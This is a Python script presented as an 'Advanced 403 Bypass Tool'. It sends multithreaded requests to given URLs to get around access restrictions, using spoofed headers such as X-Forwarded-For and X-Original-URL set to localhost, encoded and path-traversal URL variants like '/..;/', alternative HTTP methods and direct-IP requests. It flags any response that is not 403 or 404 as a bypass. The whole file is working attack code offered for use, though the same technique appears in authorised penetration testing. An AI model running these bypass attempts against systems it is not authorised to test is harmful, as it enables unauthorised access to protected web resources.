import argparse
import logging
import random
import socket
import sys
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote, urlparse
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Set up logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# User-Agent list for random selection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/18.17763 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
]

# Headers and path modifications for 403 bypass attempts
HEADERS_LIST = [
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Original-URL': '/'},
    {'Referer': 'https://www.google.com/'},
    {'X-Custom-IP-Authorization': '127.0.0.1'},
    {'X-Originating-IP': '127.0.0.1'},
    {'User-Agent': random.choice(USER_AGENTS)},
]
HTTP_METHODS = ['GET', 'POST', 'OPTIONS', 'HEAD']
PATH_MODS = ['/', '/.', '/..', '/..;/', '/%2e', '/%2e%2e']

def setup_session():
    session = requests.Session()
    retries = Retry(total=3, backoff_factor=1, status_forcelist=[403, 500])
    session.mount("http://", HTTPAdapter(max_retries=retries))
    session.mount("https://", HTTPAdapter(max_retries=retries))
    return session

def attempt_bypass(url, session, payload):
    try:
        response = session.get(url, headers={"User-Agent": payload})
        if response.status_code == 200:
            logging.info(f"Bypass successful for {url} with payload {payload}")
            return response.text
        else:
            logging.info(f"Attempted {url} with payload {payload}: {response.status_code}")
    except Exception as e:
        logging.error(f"Error accessing {url}: {str(e)}")

def advanced_bypass(url, session):
    logging.info(f"Testing advanced bypass techniques on: {url}")
    results = []

    # Try different headers
    for headers in HEADERS_LIST:
        response = session.get(url, headers=headers)
        results.append((headers, response.status_code))
    
    # Try encoded paths
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    encoded_path = quote(parsed_url.path)
    double_encoded_path = quote(encoded_path)
    
    for encoded in [encoded_path, double_encoded_path]:
        encoded_url = f"{base_url}{encoded}"
        response = session.get(encoded_url)
        results.append(({'Encoding': 'URL' if encoded == encoded_path else 'Double URL'}, response.status_code))
    
    # Try path modifications
    for path_mod in PATH_MODS:
        modified_url = f"{base_url}{parsed_url.path}{path_mod}"
        response = session.get(modified_url)
        results.append(({'Path Modification': path_mod}, response.status_code))
    
    # Try different HTTP methods
    for method in HTTP_METHODS:
        response = session.request(method, url)
        results.append(({'method': method}, response.status_code))

    # Attempt IP-based access
    try:
        ip = socket.gethostbyname(parsed_url.hostname)
        ip_url = f"{parsed_url.scheme}://{ip}{parsed_url.path}"
        response = session.get(ip_url)
        results.append(({'IP Access': ip}, response.status_code))
    except Exception as e:
        logging.error(f"IP resolution failed: {e}")

    for attempt, status in results:
        logging.info(f"Attempt: {attempt} | Status Code: {status}")
        if status not in [403, 404]:
            logging.info("Possible bypass achieved!")

def main():
    parser = argparse.ArgumentParser(description="Advanced 403 Bypass Tool")
    parser.add_argument("urls", nargs='+', help="List of URLs to test")
    parser.add_argument("--payloads", nargs='+', help="Custom payloads to use", default=USER_AGENTS)
    args = parser.parse_args()

    session = setup_session()
    with ThreadPoolExecutor(max_workers=5) as executor:
        for url in args.urls:
            for payload in args.payloads:
                executor.submit(attempt_bypass, url, session, payload)
            executor.submit(advanced_bypass, url, session)

if __name__ == "__main__":
    main()
